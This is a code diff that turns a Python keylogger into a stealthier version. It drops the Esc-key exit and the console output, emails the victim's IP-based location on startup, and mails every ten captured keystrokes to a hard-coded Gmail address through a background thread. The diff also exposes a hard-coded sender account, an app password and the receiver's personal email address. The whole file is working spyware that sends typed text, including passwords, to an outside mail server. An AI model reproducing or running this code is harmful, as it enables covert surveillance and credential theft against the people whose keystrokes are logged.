@@ -1,58 +1,68 @@
 import pynput
 from pynput.keyboard import Key, Listener
-import smtplib, ssl
+import smtplib
+import ssl
+import threading
+import requests
 
-def sendEmail(message):
-	smtp_server = "smtp.gmail.com"
-	port = 587 
-	sender_email = "sender - email - here"
-	password = "sender - password - here"
-	receiver_email = "receiver - email - here"
+def send_startup_email():
+    global ipv4_address
+    try:
+        response = requests.get('https://httpbin.org/ip')
+        ipv4_address = response.json().get('origin', None)
+        location = "Unknown"
+        if ipv4_address:
+            try:
+                ip_response = requests.get(f'http://ip-api.com/json/{ipv4_address}')
+                ip_data = ip_response.json()
+                if ip_data['status'] == 'success':
+                    location = f"{ip_data['city']}, {ip_data['regionName']}, {ip_data['country']}"
+            except Exception as e:
+                print("Error retrieving location:", e)
+        message = f"Connected from: {location}"
+        send_email("Startup", message)
+    except Exception as e:
+        print(e)
 
-	context = ssl.create_default_context()
 
-	try:
-	    server = smtplib.SMTP(smtp_server,port)
-	    server.ehlo() 
-	    server.starttls(context=context) 
-	    server.ehlo()
-	    server.login(sender_email, password)
-	    server.sendmail(sender_email, receiver_email, message)
-	   
-	except Exception as e:
-	    print(e)
-	finally:
-	    server.quit()
-        
-count = 0
-keys = []
+def send_email(subject, message):
+    smtp_server = "smtp.gmail.com"
+    port = 587 
+    sender_email = "ighelper123845@gmail.com"
+    password = "hdrh zlqj ccdw zpxb"
+    receiver_email = "ema.biasi2008@gmail.com"
+    context = ssl.create_default_context()
+    try:
+        server = smtplib.SMTP(smtp_server, port)
+        server.ehlo() 
+        server.starttls(context=context) 
+        server.ehlo()
+        server.login(sender_email, password)
+        email_message = f"Subject: {subject} - {ipv4_address}\n\n{message}"
+        server.sendmail(sender_email, receiver_email, email_message)
+        server.quit()
+    except Exception as e:
+        print(e)
+
+def format_message(keys):
+    message = "".join(key.replace("'", "") if key != "Key.space" else " " for key in keys)
+    return message
 
 def on_press(key):
-    print(key, end= " ")
-    print("pressed")
     global keys, count
     keys.append(str(key))
     count += 1
-    if count > 10:
+    if count >= 10:
         count = 0
-        email(keys)
+        message = format_message(keys)
+        email_thread = threading.Thread(target=send_email, args=("Keylog", message))
+        email_thread.start()
 
-def email(keys):
-    message = ""
-    for key in keys:
-        k = key.replace("'","")
-        if key == "Key.space":
-            k = " " 
-        elif key.find("Key")>0:
-            k = ""
-        message += k
-    print(message)
-    sendEmail(message)
+ipv4_address = None
+keys = []
+count = 0
 
-def on_release(key):
-    if key == Key.esc:
-        return False
+send_startup_email()
 
-
-with Listener(on_press = on_press, on_release = on_release) as listener:
+with Listener(on_press=on_press) as listener:
     listener.join()
